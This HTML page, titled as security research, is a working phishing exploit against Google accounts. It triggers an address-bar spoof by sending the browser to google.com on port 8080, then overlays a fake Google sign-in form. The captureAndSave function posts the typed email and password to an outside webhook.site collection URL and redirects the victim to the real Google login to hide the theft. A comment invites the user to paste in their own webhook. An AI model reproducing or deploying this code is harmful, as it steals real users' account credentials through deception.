<!DOCTYPE html>
<html>
<head>
    <title>Security Research - Address Bar Spoof</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        .login-card {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            text-align: center;
            width: 350px;
        }
        img { width: 92px; margin-bottom: 20px; }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #4285f4;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover { background-color: #357ae8; }
    </style>
</head>
<body>

    <div id="setup">
        <h1>Exploit Ready</h1>
        <p>This demo requires a vulnerable browser version.</p>
        <button onclick="spoof()">Trigger Spoof</button>
    </div>

    <script>
        function captureAndSave() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;

            // PASTE YOUR WEBHOOK URL HERE
            const webhookUrl = 'https://webhook.site/6434d8ca-3493-47ea-a4a7-9372cbc125ef';

            // Sending the data to your "data.txt" equivalent
            fetch(webhookUrl, {
                method: 'POST',
                mode: 'no-cors',
                body: `Email: ${email} | Password: ${pass}`
            }).then(() => {
                alert("Data sent to Webhook.site!");
                window.location.href = "https://accounts.google.com";
            });
        }

        function spoof() {
            // Trigger the browser hang
            window.location = "https://www.google.com:8080";

            setInterval(function() {
                if (!document.getElementById('email')) {
                    document.body.innerHTML = `
                        <div class="login-card">
                            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
                            <h2>Sign in</h2>
                            <p>Use your Google Account</p>
                            <input type="text" id="email" placeholder="Email or phone">
                            <input type="password" id="pass" placeholder="Enter your password">
                            <button onclick="captureAndSave()">Next</button>
                        </div>
                    `;
                }
            }, 100);
        }
    </script>
</body>
</html>
